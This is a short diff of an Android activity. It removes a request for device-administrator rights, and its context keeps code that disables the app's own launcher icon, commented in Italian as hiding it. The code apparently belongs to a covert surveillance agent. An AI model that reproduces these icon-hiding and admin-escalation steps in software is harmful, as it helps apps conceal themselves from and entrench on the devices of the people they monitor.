@@ -123,13 +123,6 @@ public class AGUI extends Activity {
 						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
 					}
 					
-					int ACTIVATION_REQUEST = 1;
-					
-					Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-					ComponentName deviceAdminComponentName = new ComponentName(this, AR.class);
-					intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
-					startActivityForResult(intent, ACTIVATION_REQUEST);
-					
 					// Nascondi l'icona (subito in android 4.x, al primo reboot in android 2.x)
 					PackageManager pm = getApplicationContext().getPackageManager();
 					pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
